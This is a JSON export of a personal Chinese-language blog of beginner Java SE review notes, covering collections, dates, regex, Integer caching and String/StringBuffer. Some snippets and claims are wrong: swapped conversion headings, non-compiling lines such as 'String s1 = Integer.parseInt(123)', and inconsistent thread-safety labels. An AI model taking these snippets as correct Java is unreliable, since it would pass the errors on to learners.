{"meta":{"title":"Ather · Blog","subtitle":null,"description":"知其然知其所以然","author":"Atcher","url":"http://liuhaoan.github.io","root":"/"},"pages":[{"title":"关于","date":"2019-04-05T10:40:33.000Z","updated":"2019-04-08T08:44:43.119Z","comments":true,"path":"about/index.html","permalink":"http://liuhaoan.github.io/about/index.html","excerpt":"","text":"创建本博客纯属学习，如有问题请联系QQ：1280551527 ps：转载文章请注明来源，非常感谢！ 2019 年 4 月 博客建立 1、主要用来复习JavaSE相关知识 2、其次，记录参加信息安全与评估国赛所用到的一些基本Python脚本"},{"title":"分类","date":"2019-04-05T10:40:51.000Z","updated":"2019-04-08T08:44:43.120Z","comments":true,"path":"categories/index.html","permalink":"http://liuhaoan.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-04-05T10:40:40.000Z","updated":"2019-04-08T08:44:43.121Z","comments":false,"path":"tags/index.html","permalink":"http://liuhaoan.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"javaSE复习之——Collection集合框架","slug":"javaSE复习之——Collection集合框架","date":"2019-04-09T12:54:50.000Z","updated":"2019-04-09T13:31:54.695Z","comments":true,"path":"2019/04/09/javaSE复习之——Collection集合框架/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Collection集合框架/","excerpt":"集合与数值的区别 1、数组即可以存基本数据类型也可以存引用数据类型(对象) 2、集合只能存引用数据类型，如果存基本数据类型，那么系统会自动装箱成对象。 3、数组的长度是固定的，不能自动增长 4、集合的长度是可变的。","text":"集合与数值的区别 1、数组即可以存基本数据类型也可以存引用数据类型(对象) 2、集合只能存引用数据类型，如果存基本数据类型，那么系统会自动装箱成对象。 3、数组的长度是固定的，不能自动增长 4、集合的长度是可变的。 集合与数组的缺点 数组： 长度是固定的，不能自动增加 集合： 会浪费很多空间， 原因：它的部分底层是数组，它增加长度的方法是首先创建长度为10的数组，然后不够就1.5倍增加，直到够存下为止。 Collection集合的继承体系图:123456789101112131415 Collection 单列集合的根接口,它是抽象类，一般用来父类引用子类对象 / \\ / \\ / \\ List Set 有序，有索引，可重复储存 无序，无索引，不可重复储存（我们只要学习如何保证元素不是重复的） / | \\ / \\ / | \\ / \\ / | \\ / \\ ArrayList LinkedList Vector HashSet TreeSet 查改快(直接索引查找) 查改慢(要遍历) 查改略慢 增删慢(考虑增容、拷贝) 增删快 增删慢 线程不安全 线程安全 线程安全 数组实现 链表实现 数组实现 Collection集合的方法 .add() 向集合中存入数据，list集合返回true，Set集合如果集合有相同的数据返回false，否则true。 .remove() 删除 .toArray() 把集合转换成数组输出，如果ArrayList对象加了泛型，那么可以传入某类型数组对象，然后用某类型数组直接引用。 .addAll() 把传入集合加入到调用的集合中 .removeAll() 删除调用集合中与传入集合交集的数据 .containsAll() 判断调用集合中是否有传入集合的数据 .retainAll() 取两个集合的交集，如果传入类有交集那么会把那两个值覆盖调用集合的值，调用的集合改变了就返回true，否则false List集合方法： .add(int index,) 在某个索引添加指定数据 .remove(int index,) 在某个索引删除指定数据，删除了什么就返回什么。一个小问题：remove不会自动装箱，可能会识别错误导致程序出错 .get(int index,) 输出索引对应的数据，所以list可以直接用这个方法遍历数组，不用迭代了。 .set(int index,) 设置指定索引的数据 ps：集合containsAll、removeAll等方法底层都是基于equals方法的，所以在集合中处理对象时，传入对象需要重写object父类的equals方法才能实现效果。 集合迭代的概述： 集合是存储元素，而这些元素需要查看，那么就需要用到迭代，迭代也就是遍历。 迭代使用示例：123456789Collection c = new ArrayList();Iterator it = c.iterator();//.hasNext()判断是否还有数据While(it.hasNext())&#123; System.out.println(it.next()); //.next()获取下一个数据&#125; 迭代器修改数据产生的异常与解决方案： 异常： 在利用迭代器遍历数据时，如果我们在遍历的中途给集合添加数据，那么会出现异常 异常原因： 在创建iterator迭代器时已经把集合的数量给了迭代器，如果中途给集合添加数据就是并发修改了。 解决方法： 使用iterator这个list独有的迭代器，然后调用Itterator自己的add添加数据。 Vector的概述 jdk刚出来他就有了，在jdk1.2版本加入了collection体系，后来因为vector有的功能ArrayList都有，而且还比他强大，所以不用vector了。 Vector与ArrayList的区别 Vector是线程安全的，它的效率相对低也就是查询相对慢； 反之ArrayList它是线程不安全的，但是效率高。 LinkedList集合的概述 使用链表实现的list集合。 数组实现集合与链表实现集合的优缺点： 数组： 查询修改快，但是增删慢 链表： 查询修改慢，但是增删快 集合的面试题——之ArrayList、Vector、linkedList区别： ArrayList： 数组实现，查询修改快，但是增删慢，它是线程不安全的。 LinkedList： 链表实现，查询修改慢，但是增删快，它是线程不安全的。 Vector： 数组实现，相对ArrayList查询慢效率低，因为它是线程安全的。 他们三个的用法： 1、查询多用ArrayList2、增删多用LinkedList3、增删查询都多用ArrayList4、Vector面试的时候用，虽然它是线程安全的，但是在需要线程安全的时候也不用它。 LinkedList的特殊方法 .addFirst() 与 .addLast() 在链表头部与尾部添加数据 .getFirst 与 .getLast() 获取链表头部或者尾部数据 .removeFirst 与 .removeLast() 删除链表头部或者尾部数据 .get() 获取链表指定位置的数据","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Collection集合","slug":"Collection集合","permalink":"http://liuhaoan.github.io/tags/Collection集合/"},{"name":"集合","slug":"集合","permalink":"http://liuhaoan.github.io/tags/集合/"}]},{"title":"javaSE复习之——Date、SimpDateFormat、Calendar类","slug":"javaSE复习之——Date、SimpDateFormat、Calendar类","date":"2019-04-09T12:41:36.000Z","updated":"2019-04-09T12:52:42.961Z","comments":true,"path":"2019/04/09/javaSE复习之——Date、SimpDateFormat、Calendar类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Date、SimpDateFormat、Calendar类/","excerpt":"Date的概述 获取瞬间时间，精确到毫秒。 例子： 12345Date d = new Date();//打印d会显示打印时瞬间的电脑系统时间Date d = new Date(0)//这样会打印1970年1月1日的8点","text":"Date的概述 获取瞬间时间，精确到毫秒。 例子： 12345Date d = new Date();//打印d会显示打印时瞬间的电脑系统时间Date d = new Date(0)//这样会打印1970年1月1日的8点 解析： 1、为什么是1970年1月1日：首先1970年1月1日是c语言和UNLX的生日，然后因为最早的计算机是32位的，32位最多表示的时间是68年，而最早出现的UNLX系统考虑到计算机产生的年代和应用的时限，所以综合取了1970年1月1日为UNLX 的纪元时间开始。 2、为什么是8点：因为我们电脑的时区是东8区，所以显示的是8点。 Date的方法 .getTime() 通过时间对象获取毫秒值 .setTime() 设置毫秒值，设置1000那么输出时间对象的时间为：1970年1月1日8点钟多一秒。 SimpDateFormat的概述 1、它是DateFormat的子类，拥有DateFormat的所有功能。 2、DateFormat 是日期/时间格式化子类的抽象类 3、SimpleDateFormat 是一个以与语言环境有关的方式来格式化和解析日期的具体类。它允许进行格式化（日期 -&gt; 文本）、解析（文本 -&gt; 日期）和规范化。总的来说，它们就是一个日期格式化类，构造方法传入格式规则可以按照相应的规则格式化日期。 方法 .format(Date d) 把日期类转换为String类 .parse(String str) 把时间字符串转换成日期对象，需要配合异常使用。 SimpleDateFormat类的实例12345678Date d = new Date(0);//获取当前瞬间时间SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH:mm:ss\");//创建日期格式化类并且进行格式化System.out.println(sdf.format(d));//格式化并且输出时间，结果为：1970年 Calendar类的概述 它把K的很多方法都替代掉了，Calendar 类是一个抽象类，它为特定瞬间与一组诸如 YEAR、MONTH、DAY_OF_MONTH、HOUR 等 日历字段之间的转换提供了一些方法，并为操作日历字段（例如获得下星期的日期）提供了一些方法。 方法： .getInstance() 获得一个日历，并且是基于当前时间的，返回一个Calendar的子类，可以父类引用子类对象 .get(int field) 返回指定日历字段的值，日历字段代表年月日那些，比如1那么就表示年，不过为了方便，Calendar给出了字段常量，比如Calendar.YEAR常量它的值是1，代表了年。 .add(int field,int i1) 指定字段的值加减，当前年为2018 例当前年为2018：add(Calendar.YEAR，-1)那么返回2017 .set(int year,int month,int day) 修改指定字段,可以直接修改年月日，也可以像add那样修改年等。 代码示例：123456//获取今天年月日和星期Calendar c = Calendar.getInstance();//获取一个日历System.out.println(c.get(Calendar.YEAR) + \"年\" + c.get(Calendar.MONTH) + 1 + \"月\" + c.get(Calendar.DAY_OF_MONTH) + \"日\\n星期\" + (c.get(Calendar.DAY_OF_WEEK) - 1));","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Date类","slug":"Date类","permalink":"http://liuhaoan.github.io/tags/Date类/"},{"name":"SimpDateFormat类","slug":"SimpDateFormat类","permalink":"http://liuhaoan.github.io/tags/SimpDateFormat类/"},{"name":"Calendar类","slug":"Calendar类","permalink":"http://liuhaoan.github.io/tags/Calendar类/"}]},{"title":"javaSE复习之——BigInteger与BigDecimal类","slug":"javaSE复习之——BigInteger与BigDecimal类","date":"2019-04-09T12:34:20.000Z","updated":"2019-04-09T12:40:18.041Z","comments":true,"path":"2019/04/09/javaSE复习之——BigInteger与BigDecimal类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——BigInteger与BigDecimal类/","excerpt":"BigInteger的概述 不可变的任意精度的整数。所有操作中，都以二进制补码形式表示 BigInteger（如 Java 的基本整数类型）。 BigInteger 提供所有 Java 的基本整数操作符的对应物，并提供 java.lang.Math 的所有相关方法。 另外，BigInteger 还提供以下运算：模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。","text":"BigInteger的概述 不可变的任意精度的整数。所有操作中，都以二进制补码形式表示 BigInteger（如 Java 的基本整数类型）。 BigInteger 提供所有 Java 的基本整数操作符的对应物，并提供 java.lang.Math 的所有相关方法。 另外，BigInteger 还提供以下运算：模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。 ps：了解一下BigInteger类可以存下任意长度的数值就行了。 与BigInteger不同的是，BigDecimal是小数####注意事项： 开发中创建BigDecimal对象进行运算时，给它有参构造传入的值要以字符串形式传入，如果以数值形式传入的话会损失精度。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"BigInteger类","slug":"BigInteger类","permalink":"http://liuhaoan.github.io/tags/BigInteger类/"},{"name":"BigDecimal类","slug":"BigDecimal类","permalink":"http://liuhaoan.github.io/tags/BigDecimal类/"}]},{"title":"javaSE复习之——System类","slug":"javaSE复习之——System类","date":"2019-04-09T12:23:18.000Z","updated":"2019-04-09T12:31:36.029Z","comments":true,"path":"2019/04/09/javaSE复习之——System类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——System类/","excerpt":"System类的概述 System类有标准输入、标准输出和错误输出流； 对外部定义的属性和环境变量的访问；加载文件和库的方法； 还有快速复制数组的一部分的实用方法。","text":"System类的概述 System类有标准输入、标准输出和错误输出流； 对外部定义的属性和环境变量的访问；加载文件和库的方法； 还有快速复制数组的一部分的实用方法。 字段： err标准错误流 in标准输入流 out标准输出流 System类的方法 .gc() 运行垃圾收集器，虽然objcket类中有一个filalize的方法会自动清理垃圾，但是垃圾没有超过一个量是不会自动收集的。 .exit() 退出java虚拟机jvm，传入值为0是正常终止，非0为异常终止。 .currentTimeMillis() 返回当前时间与协调世界时 1970 年 1 月 1 日午夜之间的时间差（以毫秒为单位测量）。 ps：经常应用在计算程序运行时间，从程序开始记录一次，结束记录一次，然后减去即可。 .arraycopy(Object src, int srcPos, Object dest, int destPos, int length) 从指定源数组中复制一个数组，复制从指定的位置开始，到目标数组的指定位置结束。 参数：src - 源数组。srcPos - 源数组中的起始位置。dest - 目标数组。destPos - 目标数据中的起始位置。length - 要复制的数组元素的数量。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"System类","slug":"System类","permalink":"http://liuhaoan.github.io/tags/System类/"}]},{"title":"javaSE复习之——Random类","slug":"javaSE复习之——Random类","date":"2019-04-09T12:21:11.000Z","updated":"2019-04-09T12:22:36.527Z","comments":true,"path":"2019/04/09/javaSE复习之——Random类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Random类/","excerpt":"","text":"Random概述 利用传入的随机数种子，生成一个伪随机数 Random类的方法 .nextInt(Int i); 生成一个从0到i的随机数，包括0不包括i 例子1234567Random r = new Random();//不输入种子的话系统自动使用纳秒来当作种子r.nextInt(100);//生成了0到100的随机数，不包括100//ps：如果要生成1-100的随机数，直接+1","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Random类","slug":"Random类","permalink":"http://liuhaoan.github.io/tags/Random类/"}]},{"title":"javaSE复习之——Math数学类的使用","slug":"javaSE复习之——Math数学类的使用","date":"2019-04-09T12:17:11.000Z","updated":"2019-04-09T12:20:16.752Z","comments":true,"path":"2019/04/09/javaSE复习之——Math数学类的使用/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Math数学类的使用/","excerpt":"Math类的方法 int abs(int a) 取绝对值 double ceil(double a) 向上取整数返回double，例子：输入12.56输出一个13.0 double floor(double a) 与上同理，但是向下取整数","text":"Math类的方法 int abs(int a) 取绝对值 double ceil(double a) 向上取整数返回double，例子：输入12.56输出一个13.0 double floor(double a) 与上同理，但是向下取整数 int max(int a,int b) min自学 取大的值 double pow(double a,double b) a是底数，b是指数 double random() 生成0.0到1.0之间的随机小数，包括0.0不包括1.0 int round(float a) 参数为double的自学 四舍五入 double sqrt(double a) 开平方 输入4返回2.0 输入9返回3","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Math类","slug":"Math类","permalink":"http://liuhaoan.github.io/tags/Math类/"}]},{"title":"javaSE复习之——正则表达式","slug":"javaSE复习之——正则表达式","date":"2019-04-09T11:58:39.000Z","updated":"2019-04-09T12:16:00.153Z","comments":true,"path":"2019/04/09/javaSE复习之——正则表达式/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——正则表达式/","excerpt":"正则表达式概念 就是一种规则，可以在某一段字符串中以某一个特殊的规则，取到自己想要的那段字符串。","text":"正则表达式概念 就是一种规则，可以在某一段字符串中以某一个特殊的规则，取到自己想要的那段字符串。 String中的正则表达式方法： .matches() 是否匹配这个正则表达式，返回true或者false .replaceAll(String regex,String xxx) 替换所有匹配到的字符串 ps：使用正则非常好用，例：regex的内容为\\d 那么那个字符串的所有数字都会被替换 .replaceFirst(String regex,String xxx) 替换找到的第一个字符串 .split() 以某一个字符串切割字符串 正则表达式专属类与方法实现方法：12345678Pattern p = Pattern.compile(\"a*b\");//把正则表达式编译到模式中Matcher m = p.matcher(\"aaaaab\");//使用上面创建的对象来匹配一个字符串boolean b = m.matches();//全部匹配到了则返回true 实战例子：12345678910111213String str1 = \"我手机号码是18734126341，曾经用过17707053381，曾经还用过13228865165\";Pattern p = Pattern.compile(\"1[356789]\\\\d&#123;9&#125;\");//把正则表达式编译到模式中Matcher m = p.matcher(str1);//创建一个匹配器while(m.find())//匹配下一个能成功匹配的字符串，成功返回trueSystem.out.println(m.group());//返回上一个匹配到的字符串 正则表达式字符类 表达式 获取结果 [abc] a、b 或 c（简单类） [^abc] 任何字符，除了 a、b 或 c（否定） [a-zA-Z] a 到 z 或 A 到 Z，两头的字母包括在内（范围） [a-d[m-p]] a 到 d 或 m 到 p：[a-dm-p]（并集） [a-z&amp;&amp;[def]] d、e 或 f（交集） [a-z&amp;&amp;[^bc]] a 到 z，除了 b 和 c：[ad-z]（减去） [a-z&amp;&amp;[^m-p]] a 到 z，而非 m 到 p：[a-lq-z]（减去） 正则表达式预定义字符类 表达式 获取结果 . 任何字符（与行结束符可能匹配也可能不匹配） \\d 数字：[0-9] \\D 非数字： [^0-9] \\s 空白字符：[ \\t\\n\\x0B\\f\\r] \\S 非空白字符：[^\\s] \\w 单词字符：[a-zA-Z_0-9] \\W 非单词字符：[^\\w] 正则表达式Greedy 数量词 表达式 获取结果 X? X，一次或一次也没有 X* X，零次或多次 X+ X，一次或多次 X{n} X，恰好 n 次 X{n,} X，至少 n 次 X{n,m} X，至少 n 次，但是不超过 m 次 正则表达式的分组功能 1、使用（）进行分组 例子：(.)\\1(.)\\2 代表：第一组再出现一次，第二组也再出现一次，也就是\\1同等与上一组出现的数据 例子：123str1 = “高高兴兴”str1.matches(\"(.)\\\\1(.)\\\\2\")//返回true 2、$符号，在替换时可以获取到正则表达式中某组获取到的字符，$1代表获取到第一组中的字符串 例子：12\"问问啊啊\".replaceAll(\"(.)\\\\1\",\"$1\");//替换后的结果为：问啊 $1 获取到了(.)的值","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"http://liuhaoan.github.io/tags/正则表达式/"}]},{"title":"javaSE复习之——Integer中的常见面试题","slug":"javaSE复习之——Integer中的常见面试题","date":"2019-04-09T09:16:38.000Z","updated":"2019-04-09T09:22:44.443Z","comments":true,"path":"2019/04/09/javaSE复习之——Integer中的常见面试题/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Integer中的常见面试题/","excerpt":"代码示例","text":"代码示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.heima.wrapclass;public class Demo5_Integer &#123; /** * @param args */ public static void main(String[] args) &#123; Integer i1 = new Integer(97); Integer i2 = new Integer(97); System.out.println(i1 == i2); //false System.out.println(i1.equals(i2)); //true System.out.println(\"-----------\"); Integer i3 = new Integer(197); Integer i4 = new Integer(197); System.out.println(i3 == i4); //false System.out.println(i3.equals(i4)); //true System.out.println(\"-----------\"); Integer i5 = 127; Integer i6 = 127; System.out.println(i5 == i6); //true System.out.println(i5.equals(i6)); //true System.out.println(\"-----------\"); Integer i7 = 128; Integer i8 = 128; System.out.println(i7 == i8); System.out.println(i7.equals(i8)); //true /* * -128到127是byte的取值范围,如果在这个取值范围内,自动装箱就不会新创建对象,而是从常量池中获取 * 如果超过了byte取值范围就会再新创建对象 * * public static Integer valueOf(int i) &#123; assert IntegerCache.high &gt;= 127; //i&gt;= -128 &amp;&amp; i &lt;= 127 if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); &#125; */ &#125;&#125; 总结 底层代码可以理解成一个数组，这个数组索引0对应着-128、255对应着127，当传入的值在-128 - 127之间时自动装箱时会直接在这个数组中取值，进而引用地址是一样的，所以上面返回了true","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Integer","slug":"Integer","permalink":"http://liuhaoan.github.io/tags/Integer/"},{"name":"Integer面试题","slug":"Integer面试题","permalink":"http://liuhaoan.github.io/tags/Integer面试题/"},{"name":"面试题","slug":"面试题","permalink":"http://liuhaoan.github.io/tags/面试题/"}]},{"title":"javaSE复习之——JDK5新特性之_自动拆箱与装箱","slug":"javaSE复习之——JDK5新特性之-自动拆箱与装箱","date":"2019-04-09T09:13:54.000Z","updated":"2019-04-09T09:15:22.581Z","comments":true,"path":"2019/04/09/javaSE复习之——JDK5新特性之-自动拆箱与装箱/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——JDK5新特性之-自动拆箱与装箱/","excerpt":"","text":"代码详解123456789101112int x = 123;Integer i1 = new Integer(x);//手动装箱int y = i1.intValue();//手动拆箱Ineger x = 123;//自动装箱，他的底层是手动装箱int a = x + 100;//自动拆箱，他的底层是自动拆箱","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"新特性","slug":"新特性","permalink":"http://liuhaoan.github.io/tags/新特性/"},{"name":"JDK5","slug":"JDK5","permalink":"http://liuhaoan.github.io/tags/JDK5/"},{"name":"自动拆箱","slug":"自动拆箱","permalink":"http://liuhaoan.github.io/tags/自动拆箱/"},{"name":"自动装箱","slug":"自动装箱","permalink":"http://liuhaoan.github.io/tags/自动装箱/"}]},{"title":"javaSE复习之——String转换为其他数据类型","slug":"javaSE复习之——String转换为其他数据类型","date":"2019-04-09T09:10:35.000Z","updated":"2019-04-09T09:12:42.799Z","comments":true,"path":"2019/04/09/javaSE复习之——String转换为其他数据类型/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——String转换为其他数据类型/","excerpt":"","text":"代码： .parseXXX(“”); 特点： 基本数据类型包装类有八种，其中除了char其他都有.parseXXX()方法，因为char只能存入一个字符。 代码示例： 12String s1 = \"123\";int i = Integer.parseInt(s1);","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"String","slug":"String","permalink":"http://liuhaoan.github.io/tags/String/"},{"name":"String转换为其他数据类型","slug":"String转换为其他数据类型","permalink":"http://liuhaoan.github.io/tags/String转换为其他数据类型/"}]},{"title":"javaSE复习之——String与int的相互转换","slug":"javaSE复习之——String与int的相互转换","date":"2019-04-09T09:04:41.000Z","updated":"2019-04-09T09:09:53.670Z","comments":true,"path":"2019/04/09/javaSE复习之——String与int的相互转换/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——String与int的相互转换/","excerpt":"String转int 1、String s1 = 1 + “”； 2、String s2 = string.toString(1); 3、Integer i = new Integer(1); String s1 = i.toString(); 4、String s1 = Integer.toString(1); ps:推荐用第一第二种方式，代码更简洁。","text":"String转int 1、String s1 = 1 + “”； 2、String s2 = string.toString(1); 3、Integer i = new Integer(1); String s1 = i.toString(); 4、String s1 = Integer.toString(1); ps:推荐用第一第二种方式，代码更简洁。 int转String 1、123String s1 = \"123\";Integer i = new Integer(s1);int a = i.intValue(); 2、1String s1 = Integer.parseInt(123); ps:推荐用第二种","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"String与int的相互转换","slug":"String与int的相互转换","permalink":"http://liuhaoan.github.io/tags/String与int的相互转换/"},{"name":"String转int","slug":"String转int","permalink":"http://liuhaoan.github.io/tags/String转int/"},{"name":"int转String","slug":"int转String","permalink":"http://liuhaoan.github.io/tags/int转String/"}]},{"title":"javaSE复习之——基本数据类型包装类","slug":"javaSE复习之——基本数据类型包装类","date":"2019-04-09T08:58:32.000Z","updated":"2019-04-09T09:03:44.552Z","comments":true,"path":"2019/04/09/javaSE复习之——基本数据类型包装类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——基本数据类型包装类/","excerpt":"基本数据类型和包装类的对应表 基本数据类型 包装类 byte Byte short Short long Long float Float double Double boolean Boolean —————–上面的只是改大写，下面的改的更多","text":"基本数据类型和包装类的对应表 基本数据类型 包装类 byte Byte short Short long Long float Float double Double boolean Boolean —————–上面的只是改大写，下面的改的更多 基本数据类型 包装类 int Integer char Character Integer的特点： 1、能在int和String类型之间相互转换 2、提供了处理int类型时，非常有用的其他一些常量和方法。 3、能在创建对象时传入String类型的数据，但只限于int值。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"基本数据类型包装类","slug":"基本数据类型包装类","permalink":"http://liuhaoan.github.io/tags/基本数据类型包装类/"}]},{"title":"javaSE复习之——Arrays类","slug":"javaSE复习之——Arrays类","date":"2019-04-09T08:51:02.000Z","updated":"2019-04-09T08:57:34.400Z","comments":true,"path":"2019/04/09/javaSE复习之——Arrays类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Arrays类/","excerpt":"Arrays类的概述 它其实就是一个数组的工具类，提供各种关于数组的操作","text":"Arrays类的概述 它其实就是一个数组的工具类，提供各种关于数组的操作 Arrats的方法： .toString() 数组转换为字符串 .sort() 数组排序 .binarySearch() 二分查找，返回索引值，如果没找到就返回，被查找数据在数组中应该出现的插入点的负数 减去1 前提：这个数组是一个序列数组 .asList() 把数组转换成集合，用List引用。例子： 1List&lt;String&gt; l = Arrays.asList(数组); 数组转集合的意义： 虽然从数组转换成的集合不能增加和减少，但是我们可以用集合的思想来操作数组，也就是用集合除add、remove以外的方法。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Arrays类","slug":"Arrays类","permalink":"http://liuhaoan.github.io/tags/Arrays类/"}]},{"title":"javaSE复习之——StringBuffer类","slug":"javaSE复习之——StringBuffer类","date":"2019-04-09T08:31:59.000Z","updated":"2019-04-09T08:49:48.694Z","comments":true,"path":"2019/04/09/javaSE复习之——StringBuffer类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——StringBuffer类/","excerpt":"StringBuffer的概述 1、它是字符串缓冲区（容器），底层默认是长度为16的字符数组。 2、StringBuffer是线程安全的，StringBuilder是线程不安全的 3、线程安全速度更慢，线程不安全速度更快。","text":"StringBuffer的概述 1、它是字符串缓冲区（容器），底层默认是长度为16的字符数组。 2、StringBuffer是线程安全的，StringBuilder是线程不安全的 3、线程安全速度更慢，线程不安全速度更快。 StringBuffer与String的区别 1、String赋的值它是不能被改变的，只能丢弃重新创建，如果字符拼接过多会产生过多的垃圾。 2、StringBuffer赋的值是可以被改变的，类似字符拼接建议用这个类，因为不会产生过多的垃圾。 2、虽然它们都是引用数据类型，但是String做参数传递时是和基本数据类型一样的，而StringBuffer传递的只是对创建对象的引用，也就是地址值。 StringBuffer的方法 属性获取： .capacity()返回当前容量 .length()返回实际长度 数据添加： .append()把任何数据传入字符串缓冲区，然后返回缓冲区对象本身。 .insert(索引,字符串)在任意位置之后将任意类型数据插入字符串缓冲取内，返回本身。 数据删除： .deleteCharAt()删除任意索引的数据，返回本身。 .delete(索引1,索引2)删除从索引1开始到索引2位置的数据，返回本身。（包含头不包含尾） 数据替换反转： .reverse()字符反转 .replace(开始索引，结束索引，要替换的数据)&gt;字符替换 数据截取：（截取后返回的数据不是表示容器本身，而是返回一个String） .subString(索引)从索引开始，截取到字符串末尾。 .subString(开始,结尾)从开始位置截取字符串到结尾位置，不包括结尾索引。 StringBuffer的构造方法特点 1、无参构造默认容量为 16个字符 2、传入整数，比如传入10，那么这个容器的容量就为10个字符 3、传入一个字符串，比如传入：啊啊，那么实际长度为4，字符串缓冲区容量为20 4、如果内部缓冲区溢出，那么容量自动增大。 5、StringBuffer重写了toString()方法，显示的是它的属性值，也就是它的元素。 StringBuffer注意事项 1、不要利用重新创建另一个对象来试图清空容器，这只是引用了另一个容器对象而已，之前的那个容器并没有被清空，可以利用delete方法清空容器。 2、因为String与任意字符串相加的底层实现就是使用容器，并且String的值是不能修改的，它只能把之前的数据做垃圾处理重新创建一个数据，这样会不断的产生垃圾，所以在类似 字符串数组 转换成 字符串 或者 字符串拼接（String s = s1 + s2；） 的例程中使用容器最好。 StringBuffer与String的互转： StringBuffer转String 1、创建一个String对象，把容器传进去。 2、使用toString()方法。 3、使用subString()方法。 String转StringBuffer 1、创建一个StringBuffer对象，传入字符串即可。 2、通过append()方法把字符串加入到容器内。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"StringBuffer类","slug":"StringBuffer类","permalink":"http://liuhaoan.github.io/tags/StringBuffer类/"}]},{"title":"javaSE复习之——String类","slug":"javaSE复习之——String类","date":"2019-04-09T07:42:02.000Z","updated":"2019-04-09T08:31:15.266Z","comments":true,"path":"2019/04/09/javaSE复习之——String类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——String类/","excerpt":"String类的概述 它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个基本数据类型，但其实它是一个引用数据类型.","text":"String类的概述 它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个基本数据类型，但其实它是一个引用数据类型. String类特点： 1、String实际上是一个类，它重写了toString方法，所以创建String引用后直接输出调用该引用的名称就可以输出字符串数据。 2、String属于引用数据类型，而不是基本数据类型，基本数据类型为：int、char。。。，所以String数据对比需要用到equals方法，否则会出现判断不准确的问题 3、String没有set和get方法，所以它不存在修改数据，只能是替换数据，把之前的数据当作垃圾。 4、String s = “abc” 与 String a = “abc” 它们两个变量其实是记录了常量池中的地址值，而常量池有个特性，就是已有的数据它不会再去创建，所以 s==a为ture 5、String s = &quot;a&quot; + &quot;b&quot; + &quot;c&quot; 同等于String a = &quot;abc&quot; 因为java有常量优化机制，java编译时已经确定s = abc，所以s拿到的是常量abc的地址。 6、 1234String b = \"ab\"String c = \"abc\"c == a + \"c\"//结果为false 解析：因为任何数据与字符串用 + 连接，会在堆内存中创建StringBuider 或 StringBuffer缓冲区对象并使用append方法把数据相连，这里会得出：&quot;abc&quot;然后再使用toString方法创建一个“abc”的String对象返回这个”abc”被保存在堆内存中，而不是保存在常量池，所以变量c的值是常量池中的地址，而a + “c”是堆内存中的地址，所以用“==”号做比较返回false 7、String赋的值是不可以被改变的，只有把之前的值丢弃变成垃圾后，再赋新的值。 8、String虽然是引用数据类型，但是它当作参数传递的时候，它是和基本数据类型一样的。 获取键盘输入String需要注意的 System.in 它是标准的输入流，对应着键盘录入 sc.hasNextxxx（） 它判断输入的数是不是xxx数据类型，xxx可以是int、double等 sc.nextxxx（） 它获取已经输入的项，xxx和上面的xxx相同 sc.nextLine() 